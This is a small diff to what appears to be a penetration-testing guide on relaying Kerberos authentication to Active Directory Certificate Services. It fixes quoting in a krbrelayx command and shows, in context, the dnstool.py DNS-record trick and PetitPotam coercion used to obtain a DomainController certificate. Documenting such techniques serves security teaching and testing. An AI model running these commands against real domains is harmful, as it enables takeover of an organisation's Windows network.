@@ -109,7 +109,7 @@ dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAA
 
 ```bash
 # In a first terminal, krbrelayx waiting for an authentication to relay
-krbrelayx.py -t 'http://$ADCS_FQDN/certsrv/certfnsh.asp' --adcs --template DomainController -v '$RELAYED_TARGET_SAMNAME'
+krbrelayx.py -t "http://$CA/certsrv/certfnsh.asp" --adcs --template DomainController -v "$RELAYED_TARGET_SAMNAME"
 
 # In a second terminal, coerce the victim authentication to the DNS record
 Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
